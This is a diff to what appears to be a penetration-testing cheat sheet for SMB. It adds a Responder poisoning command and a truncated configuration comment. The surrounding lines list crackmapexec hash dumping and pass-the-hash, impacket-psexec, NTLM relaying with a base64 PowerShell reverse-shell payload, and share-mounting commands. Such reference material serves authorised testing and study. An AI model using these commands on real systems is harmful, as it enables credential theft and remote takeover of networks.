@@ -282,7 +282,7 @@ $ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-us
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
 $ crackmapexec smb <IP address> -u <username> -H <hash>
 $ impacket-psexec <username>:'<password>'@<IP address>
-$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>
+$ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>        # Ensure SMB = Off in /etc/responder/Responder.conf, and 
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
 C:\> net use n: \\<IP address>\<share name>
 C:\> net use n: \\<IP address>\<share name> /user:<username> <password>
@@ -292,6 +292,8 @@ C:\> dir n: /a-d /s /b | find /c ":\"
 PS:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
 $ sudo mount -t cifs -o username=plaintext,password=<password>,domain=. //<IP address>/<share name> <target share name>
 $ mount -t cifs //<IP address>/<share name> <target share name> -o credentials=<credential file>        # credential file has to be structured per line: username=test password=test domain=.
+$ sudo responder -I ens33
+
 ```
 
 - IMAP (port 143)
